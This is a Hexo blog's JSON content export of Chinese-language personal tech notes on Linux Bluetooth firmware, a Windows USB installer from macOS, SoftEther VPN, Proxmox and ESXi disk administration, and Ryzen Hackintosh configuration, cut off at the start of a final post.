{"meta":{"title":"假的博客","subtitle":"瞎搞","description":"瞎搞、记录","author":"xfzka","url":"https://blog.110.sh"},"pages":[{"title":"关于","date":"2018-11-13T17:34:04.000Z","updated":"2020-12-27T16:04:52.946Z","comments":true,"path":"about/index.html","permalink":"https://blog.110.sh/about/index.html","excerpt":"","text":"GitHub Github CSV 倒入 keychain aria2 清理删除任务后的残留 简单的抽奖页面：DEMO 技能 Python Node Vue"}],"posts":[{"title":"Linux 驱动蓝牙","slug":"linux-bluetooth","date":"2020-12-27T16:01:13.000Z","updated":"2020-12-27T16:04:52.942Z","comments":true,"path":"2020/12/28/linux-bluetooth/","link":"","permalink":"https://blog.110.sh/2020/12/28/linux-bluetooth/","excerpt":"","text":"Linux 驱动蓝牙搞了台新设备，设备带一个AX200网卡，又有Wi-Fi又有蓝牙，Wi-Fi直接免驱，蓝牙却无法驱动，经过研究搞定了这个事情，记录下。 安装驱动 检查蓝牙服务 123service bluetooth status# 如果显示 masked 就输入下面的命令systemctl unmask bluetooth.service 安装蓝牙控制套件 1apt install bluez -y 获取蓝牙设备 12bluetoothctl show# 如果显示 No default controller available 则表示没有驱动起来 安装缺少的驱动 123456789101112131415161718192021222324252627282930# 查看蓝牙情况dmesg | grep blue# 我这里显示# bluetooth hci0: Direct firmware load for intel/ibt-20-1-3.sfi failed with error -2# 表示缺少 ibt-20-1-3.sfi 驱动文件# 进入驱动文件夹cd /lib/firmware/intel# 下载缺失的驱动，如果你缺少的是别的驱动，则替换掉文件名即可wget https://git.kernel.org/pub/scm/linux/kernel/git/firmware/linux-firmware.git/plain/intel/ibt-20-1-3.sfi# 下载完毕后重启设备reboot now# 再次查看蓝牙设备bluetoothctl show# 此时应该已经有内容了# root@vm:~# bluetoothctl show# Controller **:**:**:**:**:** (public)# Name: vm# Alias: vm# Class: 0x00000104# Powered: yes# Discoverable: no# Pairable: yes# UUID: Generic Attribute Profile (00001801-0000-1000-8000-00805f9b34fb)# UUID: A/V Remote Control (0000110e-0000-1000-8000-00805f9b34fb)# UUID: PnP Information (00001200-0000-1000-8000-00805f9b34fb)# UUID: A/V Remote Control Target (0000110c-0000-1000-8000-00805f9b34fb)# UUID: Generic Access Profile (00001800-0000-1000-8000-00805f9b34fb)# Modalias: usb:v1D6Bp0246d0532# Discovering: no 设备控制12345678910111213141516171819202122232425262728# 进入蓝牙控制 如果进入了，应该是这样的 [bluetooth]# bluetoothctl# 开启扫描 屏幕上会出现一堆设备的 MAC 地址scan on# Discovery started# [CHG] Controller E0:D4:E8:94:07:86 Discovering: yes# [NEW] Device 54:21:C3:BC:77:1A 54-21-C3-BC-77-19# [NEW] Device E9:33:F9:B9:6B:AF MX Keys# [NEW] Device 48:AB:38:E9:67:89 48-AB-38-E9-67-84# [NEW] Device F4:5C:89:AB:57:61 F4-5C-89-AB-57-66# 关闭扫描scan off# 连接指定设备，屏幕上会出现不少内容，主要看# 出现 Connection successful 则连接成功connect E9:33:F9:B9:6B:AF# 在蓝牙控制中 如果链接了蓝牙设备，或者断开了蓝牙设备都会有提示# 有设备链接# [CHG] Device E9:33:F9:B9:6B:AF Connected: yes# [CHG] Device E9:33:F9:B9:6B:AF ServicesResolved: yes# 有设备断开# [CHG] Device E9:33:F9:B9:6B:DE ServicesResolved: no# [CHG] Device E9:33:F9:B9:6B:DE Connected: no","categories":[{"name":"linux","slug":"linux","permalink":"https://blog.110.sh/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://blog.110.sh/tags/linux/"},{"name":"bluetooth","slug":"bluetooth","permalink":"https://blog.110.sh/tags/bluetooth/"},{"name":"AX200","slug":"AX200","permalink":"https://blog.110.sh/tags/AX200/"}]},{"title":"如何在 macOS 下创建 Windows 安装U盘","slug":"how-to-create-bootable-windows-USB-on-macOS","date":"2020-09-24T10:30:00.000Z","updated":"2020-12-27T16:04:52.942Z","comments":true,"path":"2020/09/24/how-to-create-bootable-windows-USB-on-macOS/","link":"","permalink":"https://blog.110.sh/2020/09/24/how-to-create-bootable-windows-USB-on-macOS/","excerpt":"","text":"如何在 macOS 下创建 Windows 安装U盘即使所有设备都是苹果的东西了，但是还是避免不了身边的人需要使用 Windows 电脑，或者重装 Windows 系统，这时就需要创建 Windows 安装盘了。 准备 U盘（存储空间需要大于等于 8G，且要求格式化U盘） Windows 系统镜像（ISO格式） wimlib-imagex 大文件分割 rsync 文件复制 安装必备工具使用 brew 安装这两个工具，如果已经安装请跳过 1brew cask install rsync wimlib 制作 找到自己的U盘，如 disk3 1diskutil list 格式化自己的U盘，并起名为 WINDOWS10，请务必确认替换掉disk3为你的U盘 123diskutil eraseDisk MS-DOS \"WINDOWS10\" MBR disk3# 如果你清楚什么是 MBR/GPT 你也可以选择 GPTdiskutil eraseDisk MS-DOS \"WINDOWS10\" GPT disk3 装载系统盘，直接双击挂载，如果你觉得手动方式一点都不酷，你也可以使用命令挂载 1hdiutil mount ~/Downloads/Win10_2004_Chinese(Simplified)_x64.iso 复制除了sources/install.wim文件到U盘 1rsync -vha --exclude=sources/install.wim /Volumes/CCCOMA_X64FRE_ZH-CN_DV9/* /Volumes/WINDOWS10 分割复制sources/install.wim到U盘 因为这个文件太大，fat32格式装不下，会报错：File too large，所以需要分割复制。 1wimlib-imagex split /Volumes/CCCOMA_X64FRE_ZH-CN_DV9/sources/install.wim /Volumes/WINDOWS10/sources/install.swm 4000 至此全部完成，现在可以直接当做 Windows 的启动盘了。","categories":[{"name":"macOS","slug":"macOS","permalink":"https://blog.110.sh/categories/macOS/"}],"tags":[{"name":"windows","slug":"windows","permalink":"https://blog.110.sh/tags/windows/"},{"name":"macOS","slug":"macOS","permalink":"https://blog.110.sh/tags/macOS/"},{"name":"bootable USB","slug":"bootable-USB","permalink":"https://blog.110.sh/tags/bootable-USB/"}]},{"title":"使用 SoftEther 搭建 L2TP VPN","slug":"ubuntu-setup-softether-vpn","date":"2020-08-23T17:04:36.000Z","updated":"2020-12-27T16:04:52.946Z","comments":true,"path":"2020/08/24/ubuntu-setup-softether-vpn/","link":"","permalink":"https://blog.110.sh/2020/08/24/ubuntu-setup-softether-vpn/","excerpt":"","text":"使用 SoftEther 搭建 L2TP VPN在openwrt上搭建 L2TP VPN 都推荐用 openswan、libreswan 比较繁琐，softether在openwrt上不知道为什么总是丢失配置文件，所以要在Linux上配置，softether这个简单易用还容易管理，也能完成多地组网的复杂操作。 安装编译安装12345678910# 安装编译工具apt install build-essential gcc make wget tzdata git libreadline-dev libncurses-dev libssl-dev zlib1g-dev# 下载源码git clone https://github.com/SoftEtherVPN/SoftEtherVPN_Stable.git# 编译，我编译的时候丝般顺滑，一点报错都没有（Ubuntu 20.04）cd SoftEtherVPN_Stable/./configuremake# 安装make install 开机自启 创建文件：/lib/systemd/system/vpnserver.service 1234567891011[Unit]Description=SoftEther VPN ServerAfter=network.target[Service]Type=forkingExecStart=/usr/bin/vpnserver startExecStop=/usr/bin/vpnserver stop[Install]WantedBy=multi-user.target 1234# 开启这个服务systemctl enable vpnserver.service# 启动服务service vpnserver start 配置L2TP配置咕了，这东西配置起来很容易很容易，教程特别多，都是中文的，大致说一下有两种配置方式： 一种是通过命令行配置vpncmd，这里如果你的Linux服务器是中文的，那么这个vpncmd的命令帮助都是中文的，简直太简单，这个vpncmd值得好好玩一玩，GUI配置有些时候着实是不方便。 另一种是通过管理程序配置，也是中文的，配置工具下载 https://www.softether-download.com/cn.aspx?product=softether。 如果想要访问内网的东西，需要开启SecureNAT。 参考配置教程： 中文：https://noter.tw/4524/softether-vpn-架設記錄/ 官方英文（不推荐）：https://www.softether.org/4-docs/2-howto/9.L2TPIPsec_Setup_Guide_for_SoftEther_VPN_Server/1.Setup_L2TP%2F%2F%2F%2FIPsec_VPN_Server_on_SoftEther_VPN_Server 中文：https://libertyleadingnetwork.blogspot.com/2018/01/softethervpsvpn.html 中文：http://blog.dengxj.com/archives/9/ 端口转发如果你和我一样是在内网配置的，且有公网IP，需要在路由器上转发UDP:500和UDP:4500出去，再搞一个DDNS这样就可以远程访问家里了。","categories":[{"name":"Linux","slug":"Linux","permalink":"https://blog.110.sh/categories/Linux/"}],"tags":[{"name":"VPN, L2TP, SoftEther, Linux","slug":"VPN-L2TP-SoftEther-Linux","permalink":"https://blog.110.sh/tags/VPN-L2TP-SoftEther-Linux/"}]},{"title":"Ubuntu 编译 vmfs-tool","slug":"ubuntu-make-vmfs-tool","date":"2020-06-14T17:07:19.000Z","updated":"2020-12-27T16:04:52.946Z","comments":true,"path":"2020/06/15/ubuntu-make-vmfs-tool/","link":"","permalink":"https://blog.110.sh/2020/06/15/ubuntu-make-vmfs-tool/","excerpt":"","text":"Ubuntu 编译 vmfs-toolVMFS 文件系统想要在 linux 里读取，需要使用vmfs-fuse，但是这个工具已经下架了，所以需要自己编译, 其实编译整理来说就是缺什么下什么，然后就编译完了。 我的系统：ubuntu 20.04 vmfs-tools 下载地址如果只做读取使用这个就可以了 http://mirrors.kernel.org/ubuntu/pool/universe/v/vmfs-tools/vmfs-tools_0.2.5-1_amd64.deb http://mirrors.kernel.org/ubuntu/pool/universe/v/vmfs-tools/vmfs-tools_0.2.5-1_i386.deb 下载下来后，直接安装即可 1opkg -i vmfs-tools_0.2.5-1_amd64.deb 挂载 VMFS 文件系统其实挂载VMFS 文件系统很简单，类似 mount 命令 12345# 查看哪个是 VMFSfdisk -l# 挂载 /dev/sdb3mkdir /tmp/vmfsvmfs-fuse /dev/sdb3 /tmp/vmfs 或者你也可以手动编译安装需要的库1apt install git build-essential gcc pkg-config xsltproc libfuse-dev uuid-dev 下载源码编译123456789101112131415# 下载源码cd /tmpgit clone https://github.com/glandium/vmfs-tools.gitcd vmfs-tools# 开始编译./configure makegcc -Wall -O2 -g -D_FILE_OFFSET_BITS=64 -Ivmfs-fuse -Ilibvmfs -I/usr/include/uuid -D_FILE_OFFSET_BITS=64 -I/usr/include/fuse -c -o vmfs-fuse/vmfs-fuse.o vmfs-fuse/vmfs-fuse.cgcc -o vmfs-fuse/vmfs-fuse vmfs-fuse/vmfs-fuse.o libvmfs/libvmfs.a -luuid -lfuse -pthread# 安装make installinstall -s -m 0755 debugvmfs/debugvmfs /usr/local/sbin/install -s -m 0755 vmfs-lvm/vmfs-lvm /usr/local/sbin/install -s -m 0755 vmfs-fuse/vmfs-fuse /usr/local/sbin/install -s -m 0755 fsck.vmfs/fsck.vmfs /usr/local/sbin/","categories":[{"name":"Linux","slug":"Linux","permalink":"https://blog.110.sh/categories/Linux/"}],"tags":[{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://blog.110.sh/tags/Ubuntu/"},{"name":"Linux","slug":"Linux","permalink":"https://blog.110.sh/tags/Linux/"},{"name":"编译","slug":"编译","permalink":"https://blog.110.sh/tags/编译/"},{"name":"vmfs","slug":"vmfs","permalink":"https://blog.110.sh/tags/vmfs/"},{"name":"esxi","slug":"esxi","permalink":"https://blog.110.sh/tags/esxi/"}]},{"title":"ESXI SSH 免密码登陆","slug":"esxi-ssh-login-without-password","date":"2020-06-14T17:00:52.000Z","updated":"2020-12-27T16:04:52.942Z","comments":true,"path":"2020/06/15/esxi-ssh-login-without-password/","link":"","permalink":"https://blog.110.sh/2020/06/15/esxi-ssh-login-without-password/","excerpt":"","text":"ESXI SSH 免密码登陆ESXI 的 authorized_keys 在 /etc/ssh/keys-root/authorized_keys 所以 ssh-copy-id 不会成功。 查看自己的公钥 1cat ~/.ssh/id_rsa.pub 把自己的公钥写入到 1echo \"你的公钥\" &gt; /etc/ssh/keys-root/authorized_keys 完毕","categories":[{"name":"折腾","slug":"折腾","permalink":"https://blog.110.sh/categories/折腾/"}],"tags":[{"name":"ESXI","slug":"ESXI","permalink":"https://blog.110.sh/tags/ESXI/"}]},{"title":"Mac 修改 hostname","slug":"change-hostname-on-mac","date":"2020-06-11T14:35:46.000Z","updated":"2020-12-27T16:04:52.942Z","comments":true,"path":"2020/06/11/change-hostname-on-mac/","link":"","permalink":"https://blog.110.sh/2020/06/11/change-hostname-on-mac/","excerpt":"","text":"Mac 修改 hostname黑苹果，前一阵子升级了系统，顺利升级，唯独发现主机名变成了iMacPro，这就有些难受了，导致 airdrop 时出现了 两个机器，所以一定要修改回来，修改命令如下。 执行命令 12345sudo scutil --set LocalHostName RyzenMacProsudo scutil --set HostName RyzenMacProsudo scutil --set ComputerName RyzenMacProsudo hostname RyzenMacProdscacheutil -flushcache 重启路由器，不然 netbios 名称修改不过来 重启电脑，最好在重启路由器的操作执行过后就直接重启电脑","categories":[{"name":"黑苹果","slug":"黑苹果","permalink":"https://blog.110.sh/categories/黑苹果/"}],"tags":[{"name":"Mac","slug":"Mac","permalink":"https://blog.110.sh/tags/Mac/"},{"name":"Hackintosh","slug":"Hackintosh","permalink":"https://blog.110.sh/tags/Hackintosh/"},{"name":"Ryzentosh","slug":"Ryzentosh","permalink":"https://blog.110.sh/tags/Ryzentosh/"}]},{"title":"GitHub action 自动部署 Hexo","slug":"github-action-auto-deploy-hexo","date":"2020-05-31T17:59:03.000Z","updated":"2020-12-27T16:04:52.942Z","comments":true,"path":"2020/06/01/github-action-auto-deploy-hexo/","link":"","permalink":"https://blog.110.sh/2020/06/01/github-action-auto-deploy-hexo/","excerpt":"","text":"GitHub action 自动部署 Hexo首先贴上我的 yaml 代码，这可能是目前最简洁的了，因为加上了缓存，所以执行起来也较快，使用的是 https://github.com/yrpang/github-actions-hexo。 12345678910111213141516171819name: Deploy blogon: [push]jobs: build: runs-on: ubuntu-latest steps: - uses: actions/checkout@v1 - name: Cache node modules # 缓存 node_modules uses: actions/cache@v1 with: path: node_modules key: $&#123;&#123;runner.OS&#125;&#125;-$&#123;&#123;hashFiles('**/package-lock.json')&#125;&#125; - uses: yrpang/github-actions-hexo@master env: TZ: Asia/Shanghai # 设置时区 with: deploykey: $&#123;&#123;secrets.DEPLOY_KEY&#125;&#125; # 这里注意对应自己配置的KEY的名称 username: github-action email: action@github 使用 GitHub action 还是老生常谈的那一套secret key和deploy key就不多说了，参考： 英文：https://github.com/marketplace/actions/hexo-action#pre-requisites 中文：https://hdj.me/github-actions-hexo-cicd/#配置-GitHub-仓库 中文：https://gythialy.github.io/deploy-hexo-to-github-pages-via-github-actions/#准备工作 与其它不太一样的是： 源码的package.json文件中必须包含hexo-deployer-git 源码的_config.yml文件中必须包含deploy块，且 repo 必须为 ssh 形式，如： 1234567# ...# 部署## Docs: https://hexo.io/docs/deployment.htmldeploy: type: git # 这里填写博客 repo 地址，非源码地址 repo: git@github.com:YOU_USERNAME/blog.git 如果上面的条件确定满足了，直接复制上面的 action 代码使用即可。 本篇文章由 GitHub action 自动生成。","categories":[{"name":"折腾","slug":"折腾","permalink":"https://blog.110.sh/categories/折腾/"}],"tags":[{"name":"github","slug":"github","permalink":"https://blog.110.sh/tags/github/"},{"name":"hexo","slug":"hexo","permalink":"https://blog.110.sh/tags/hexo/"}]},{"title":"我的图床相关内容","slug":"image-test","date":"2020-05-30T15:50:12.000Z","updated":"2020-12-27T16:04:52.942Z","comments":true,"path":"2020/05/30/image-test/","link":"","permalink":"https://blog.110.sh/2020/05/30/image-test/","excerpt":"","text":"我的图床相关内容终于没忍住诱惑，还是用上了图床，特地来测试一下。 环境软件：uPic + Typora 配合 图床：Github + 自定义域名 安装安装 uPic Typora 1brew cask install upic typora 配置图床官方教程 Github 图床提醒在 github 图床的设置中，自定义域名设置与 github 的 pages 不同，需要加上 https:// 或 http://，如 img.baidu.com，要写成 https://img.baidu.com ，否则明明返回了图片地址 typora 依然会认为上传失败。 看来 typora 的正则比较严格 😔","categories":[{"name":"折腾","slug":"折腾","permalink":"https://blog.110.sh/categories/折腾/"}],"tags":[{"name":"图床","slug":"图床","permalink":"https://blog.110.sh/tags/图床/"}]},{"title":"PVE 增加 pve/root 容量","slug":"resize-pve-root","date":"2020-05-30T15:04:38.000Z","updated":"2020-12-27T16:04:52.942Z","comments":true,"path":"2020/05/30/resize-pve-root/","link":"","permalink":"https://blog.110.sh/2020/05/30/resize-pve-root/","excerpt":"","text":"PVE 增加 pve/root 容量PVE 在安装时默认不会使用全部硬盘容量用作 pve/root ，为的是存储其它内容，诸如dump，但是我有其它的硬盘存储备份，所以需要把 pve/root 扩容。 1234567891011# 增加全部剩余空间lvresize -l +100%FREE /dev/pve/root# 你也可以增加指定容量# lvresize -l +10G /dev/pve/root# 增加后确定扩容resize2fs /dev/mapper/pve-root# 查看是否扩容成功lvdisplay","categories":[{"name":"pve","slug":"pve","permalink":"https://blog.110.sh/categories/pve/"}],"tags":[{"name":"pve","slug":"pve","permalink":"https://blog.110.sh/tags/pve/"}]},{"title":"PVE 硬盘相关","slug":"pve-hdd","date":"2020-05-28T05:02:00.000Z","updated":"2020-12-27T16:04:52.942Z","comments":true,"path":"2020/05/28/pve-hdd/","link":"","permalink":"https://blog.110.sh/2020/05/28/pve-hdd/","excerpt":"","text":"PVE 硬盘相关休眠PVE 硬盘不休眠的原因基本都是由于pvestatd一直在读取硬盘信息，导致不会休眠 所以问题就比较简单了 第一种方法 （比较粗暴，不推荐） 1pvestatd stop 第二种方法 修改/etc/lvm/lvm.conf文件，开启 lvm 的 metadata 的缓存 1234# 开启sed -i 's/use_lvmetad = 0/use_lvmetad = 1/g' /etc/lvm/lvm.conf# 重启pvestatd restart 如果开启的话，就会缓存 lvm 的信息，就不需要再读取硬盘获取了 第三种方法 修改/etc/lvm/lvm.conf文件，过滤不需要监控的盘 1234# 添加 \"r|/dev/sd*|\" 到 global_filterglobal_filter = [ \"r|/dev/zd.*|\", \"r|/dev/mapper/pve-.*|\", \"r|/dev/sd*|\" ]# 重启pvestatd restart 通过以上方式允许硬盘休眠后，可以让硬盘立即休眠来测试下是否还会被唤醒 1234# 立即休眠hdparm -y /dev/sdc# 设置硬盘休眠时间为 5 分钟hdparm -S 60 /dev/sdc 这里-S取值设定逻辑比较奇怪，本文列出部分常见取值供选： 30 = 2 min 30 sec 60 = 5 minutes 120 = 10 minutes 180 = 15 minutes 241 = 30 minutes 242 = 1 hour 243 = 1.5 hours 244 = 2 hours 持久化保存 休眠时间不要添加到各种开机启动的脚本、crontab 中 编辑/etc/hdparm.conf就可以做到持久化保存休眠配置 第一种在 command_line 处 123command_line &#123; hdparm -S 60 /dev/disk/by-uuid/f6c52265-d89f-43a4-b03b-302c3dadb215 &#125; 第二种在 特定硬盘处 1234# 这里也可以改为 sdc 或者 /dev/disk/by-label/8TB，但是 UUID 最稳定/dev/disk/by-uuid/91e32677-0656-45b8-bcf5-14acce39d9c2 &#123; spindown_time = 60&#125; 挂载硬盘 给 lxc首先需要注意的是，创建 LXC 容器需要在创建时开启了特权模式，否则只能读取但无法写入数据。 假设 lxc id 是 202 使用 sd* 挂载设备 （不推荐）123456# 停止pct stop 202# 挂载 sdc 到 /datapct set 202 -mp0 /dev/sdc,mp=/data# 开机pct start 202 使用 UUID 挂载设备（推荐）因为 /dev/sdb /dev/sdc 这种形式可能会随着插拔设备之类的发生变动，或改变顺序，而 UUID 则不会改变 12345678# 停止pct stop 202# 获取设备 UUIDblkid /dev/sdc# 挂载 sdc 到 /datapct set 202 -mp0 /dev/disk/by-uuid/312e15c4-c8e8-4465-8099-2f1cf007fe92,mp=/data# 开机pct start 202","categories":[{"name":"Linux","slug":"Linux","permalink":"https://blog.110.sh/categories/Linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://blog.110.sh/tags/linux/"},{"name":"pve","slug":"pve","permalink":"https://blog.110.sh/tags/pve/"}]},{"title":"PVE 移动虚拟磁盘到另一台虚拟机","slug":"PVE 移动虚拟磁盘到另一台虚拟机","date":"2020-02-18T14:57:08.000Z","updated":"2020-12-27T16:04:52.942Z","comments":true,"path":"2020/02/18/PVE 移动虚拟磁盘到另一台虚拟机/","link":"","permalink":"https://blog.110.sh/2020/02/18/PVE 移动虚拟磁盘到另一台虚拟机/","excerpt":"","text":"PVE 移动虚拟磁盘到另一台虚拟机 准备工作，原主机和目标主机都要关机，然后把原主机的硬盘卸载 磁盘改名 12lvrename /dev/pve/vm-103-disk-1 /dev/pve/vm-200-disk-1# Renamed \"vm-103-disk-1\" to \"vm-200-disk-1\" in volume group \"pve\" 查看配置结构 不知道怎么挂载的就手动添加一个硬盘查看下配置结构 这里我添加了一个挂载点 /test ，大小 8G 1cat /etc/pve/nodes/pve-asus/lxc/200.conf 12345678910arch: amd64cores: 2hostname: localService1804memory: 2048mp0: local-lvm:vm-200-disk-1,mp=/test,size=8Gnet0: name=eth0,bridge=vmbr0,firewall=1,gw=10.0.0.1,hwaddr=DA:7D:AB:9D:AB:97,ip=10.0.0.250/24,type=vethostype: ubunturootfs: local-lvm:vm-200-disk-0,size=8Gswap: 2048unprivileged: 1 我这个目的地是 lxc 的，所以路径不一样，如果是 kvm 就去 /etc/pve/nodes/pve-asus/qemu-server/200.conf 编辑配置文件 添加 要挂载的磁盘 上去 1echo \"local-lvm:vm-200-disk-1,mp=/data,size=32G\" &gt;&gt; /etc/pve/nodes/pve-asus/lxc/200.conf 此时在 web 界面上，硬盘应该已经出现在目标主机了 开机验货 完成 参考资料 https://pve.proxmox.com/wiki/Moving_disk_image_from_one_KVM_machine_to_another","categories":[{"name":"PVE","slug":"PVE","permalink":"https://blog.110.sh/categories/PVE/"}],"tags":[{"name":"PVE","slug":"PVE","permalink":"https://blog.110.sh/tags/PVE/"},{"name":"lxc","slug":"lxc","permalink":"https://blog.110.sh/tags/lxc/"},{"name":"kvm","slug":"kvm","permalink":"https://blog.110.sh/tags/kvm/"}]},{"title":"XFS 文件系统扩充","slug":"xfs-filesystem-grow","date":"2020-01-29T16:14:08.000Z","updated":"2020-12-27T16:04:52.946Z","comments":true,"path":"2020/01/30/xfs-filesystem-grow/","link":"","permalink":"https://blog.110.sh/2020/01/30/xfs-filesystem-grow/","excerpt":"","text":"XFS 文件系统扩充1234# 直接扩充到最大大小xfs_growfs 挂载的目录# 如xfs_growfs /data","categories":[{"name":"hackintosh","slug":"hackintosh","permalink":"https://blog.110.sh/categories/hackintosh/"}],"tags":[{"name":"hackintosh","slug":"hackintosh","permalink":"https://blog.110.sh/tags/hackintosh/"},{"name":"mojave","slug":"mojave","permalink":"https://blog.110.sh/tags/mojave/"}]},{"title":"AMD 黑苹果 Catalina 简单记录","slug":"Ryzentosh","date":"2019-10-27T10:02:00.000Z","updated":"2020-12-27T16:04:52.942Z","comments":true,"path":"2019/10/27/Ryzentosh/","link":"","permalink":"https://blog.110.sh/2019/10/27/Ryzentosh/","excerpt":"","text":"AMD 黑苹果 Catalina本文主要是记录下在使用 Vanilla 折腾黑苹果过程中的各种问题。 操作主要是根据这里操作的：https://vanilla.amd-osx.com 除非特殊的硬件可能需要旧版外，所有 kext 都尽可能安装新版，旧版存在都问题新版都可能已经修复了，所以遇到问题不妨试试更新。 USB 驱动不完美导致的 USB 蓝牙不工作描述板载 USB 母口都能正常工作，但是板载针脚 USB 都不能驱动。 解决方案先安装 USBInjectAll.kext 然后 打2个补丁 1234567Name: com.apple.iokit.IOUSBHostFamilyFind: 83FB0F0FReplace: 83FB3F0FName com.apple.driver.usb.AppleUSBXHCIFind: 83F90F0FReplace: 83F93F0F Rx580 DP 口无法显示描述在安装系统时可以使用 DP 口输出内容，而安装完开机进入苹果系统后黑屏。 解决方案先使用 HDMI 输出，随后使用使用 Clover Configurator 来更新到新版 Lilu.kext、WhateverGreen.kext 即可解决问题。 开机瞬间出现紫色横条描述Rx580 在苹果系统开机时出现瞬间的紫色线条，虽然马上就消失，但是很不舒服。 解决方案还是需要打两个补丁，来源：https://github.com/athlonreg/Common-patches-for-hackintosh/commit/a333627981b83d2a6344391f0cc760dc94ba6b1f 1234567Name: AMDSupportFind: 553B0C90Replace: 5539C990Name: AMDSupportFind: C704B1AA 55AA55Replace: 90909090 909090 总是卡在 Report this panic描述安装过程中总是会提示 Report this panic，其中向上能看到 AppleMCEReporter 或 !A!IMCEReporter 字样 解决方案安装 AppleMCEReporterDisabler.kext，地址：https://files.amd-osx.com/AppleMCEReporterDisabler.kext.zip 来源：https://amd-osx.com/2019/10/10/macos-catalina-is-on-amd/ 添加或移除内存后不能开机描述在我给电脑加了两条内存后出现无法开机的状况，找了几个教程都文不对题。 错误提示： 123OsxAptioFixDrv: Starting override for System\\Library\\CoreServices\\boot.efiUsing rebloc block:yes,hibernate wake:no++++++++++++++++++++++++++++++++++++++++ 解决方案进入Windows系统，使用 CPU-Z 生成一份报告，找到 Memory SPD 部分，然后逐个写进去，或者拔掉内存启动电脑用 Clover configure 写好在插上。 123456789DIMM # 1 ==============&gt;&gt;&gt;&gt; 这个是内存插槽编号，写在 config.plist 时记得减 1，写在 Slot SMBus address 0x50 Memory type DDR4 ==============&gt;&gt;&gt;&gt; 这个是内存类型，直接写在 Type 里就好 Module format UDIMM Module Manufacturer(ID) CUSO (7F7F7F7F7F7F7F7FBC0000) ==============&gt;&gt;&gt;&gt; 这个是内存厂商，写在 Vendor 里 SDRAM Manufacturer (ID) Micron Technology (2C00000000000000000000) Size 16384 MBytes ==============&gt;&gt;&gt;&gt; 这个是内存大小，写在 Size 里 Max bandwidth DDR4-2400 (1200 MHz) ==============&gt;&gt;&gt;&gt; 这个是内存频率，写在 Frequency 里 Part number CS4U2400D17161C ==============&gt;&gt;&gt;&gt; 这不知道怎么翻译，写在 Part 里 写下面的东西到，&lt;key&gt;Memory&lt;/key&gt; 部分。 1234567891011121314&lt;dict&gt; &lt;key&gt;Frequency&lt;/key&gt; &lt;integer&gt;内存频率&lt;/integer&gt; &lt;key&gt;Part&lt;/key&gt; &lt;string&gt;F4-3200C16-8GTZR&lt;/string&gt; &lt;key&gt;Size&lt;/key&gt; &lt;integer&gt;内存大小单位是MB&lt;/integer&gt; &lt;key&gt;Slot&lt;/key&gt; &lt;integer&gt;插槽编号&lt;/integer&gt; &lt;key&gt;Type&lt;/key&gt; &lt;string&gt;DDR4&lt;/string&gt; &lt;key&gt;Vendor&lt;/key&gt; &lt;string&gt;厂商&lt;/string&gt;&lt;/dict&gt; 下面是我的 内存部分 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566&lt;key&gt;Memory&lt;/key&gt;&lt;dict&gt; &lt;key&gt;Channels&lt;/key&gt; &lt;integer&gt;2&lt;/integer&gt; &lt;key&gt;Modules&lt;/key&gt; &lt;array&gt; &lt;dict&gt; &lt;key&gt;Frequency&lt;/key&gt; &lt;integer&gt;2400&lt;/integer&gt; &lt;key&gt;Part&lt;/key&gt; &lt;string&gt;CS4U2400D17161C&lt;/string&gt; &lt;key&gt;Size&lt;/key&gt; &lt;integer&gt;16384&lt;/integer&gt; &lt;key&gt;Slot&lt;/key&gt; &lt;integer&gt;0&lt;/integer&gt; &lt;key&gt;Type&lt;/key&gt; &lt;string&gt;DDR4&lt;/string&gt; &lt;key&gt;Vendor&lt;/key&gt; &lt;string&gt;CUSO&lt;/string&gt; &lt;/dict&gt; &lt;dict&gt; &lt;key&gt;Frequency&lt;/key&gt; &lt;integer&gt;2400&lt;/integer&gt; &lt;key&gt;Part&lt;/key&gt; &lt;string&gt;F4-3200C16-8GTZR&lt;/string&gt; &lt;key&gt;Size&lt;/key&gt; &lt;integer&gt;8192&lt;/integer&gt; &lt;key&gt;Slot&lt;/key&gt; &lt;integer&gt;1&lt;/integer&gt; &lt;key&gt;Type&lt;/key&gt; &lt;string&gt;DDR4&lt;/string&gt; &lt;key&gt;Vendor&lt;/key&gt; &lt;string&gt;G.Skill&lt;/string&gt; &lt;/dict&gt; &lt;dict&gt; &lt;key&gt;Frequency&lt;/key&gt; &lt;integer&gt;2400&lt;/integer&gt; &lt;key&gt;Part&lt;/key&gt; &lt;string&gt;CS4U2400D17161C&lt;/string&gt; &lt;key&gt;Size&lt;/key&gt; &lt;integer&gt;16384&lt;/integer&gt; &lt;key&gt;Slot&lt;/key&gt; &lt;integer&gt;2&lt;/integer&gt; &lt;key&gt;Type&lt;/key&gt; &lt;string&gt;DDR4&lt;/string&gt; &lt;key&gt;Vendor&lt;/key&gt; &lt;string&gt;CUSO&lt;/string&gt; &lt;/dict&gt; &lt;dict&gt; &lt;key&gt;Frequency&lt;/key&gt; &lt;integer&gt;2400&lt;/integer&gt; &lt;key&gt;Part&lt;/key&gt; &lt;string&gt;F4-3200C16-8GTZR&lt;/string&gt; &lt;key&gt;Size&lt;/key&gt; &lt;integer&gt;8192&lt;/integer&gt; &lt;key&gt;Slot&lt;/key&gt; &lt;integer&gt;3&lt;/integer&gt; &lt;key&gt;Type&lt;/key&gt; &lt;string&gt;DDR4&lt;/string&gt; &lt;key&gt;Vendor&lt;/key&gt; &lt;string&gt;G.Skill&lt;/string&gt; &lt;/dict&gt; &lt;/array&gt; &lt;key&gt;SlotCount&lt;/key&gt; &lt;integer&gt;3&lt;/integer&gt;&lt;/dict&gt; 常用 kext 官方主页 不是说从第三方下载不好或者不安全什么的，而是第三方更新可能不及时，很多时候更新能解决你现有的问题。 Lilu[必备]: https://github.com/acidanthera/Lilu/releases WhateverGreen[显卡]: https://github.com/acidanthera/WhateverGreen/releases VoodooHDA[声音]: https://sourceforge.net/projects/voodoohda/ AppleALC[声音]: https://github.com/acidanthera/AppleALC/releases USBInjectAll[USB]: https://bitbucket.org/RehabMan/os-x-usb-inject-all/downloads/ 其他的我用不到或者找不到官方主页就不放了。","categories":[{"name":"黑苹果","slug":"黑苹果","permalink":"https://blog.110.sh/categories/黑苹果/"}],"tags":[{"name":"Mac","slug":"Mac","permalink":"https://blog.110.sh/tags/Mac/"},{"name":"黑苹果","slug":"黑苹果","permalink":"https://blog.110.sh/tags/黑苹果/"}]},{"title":"使用 overture 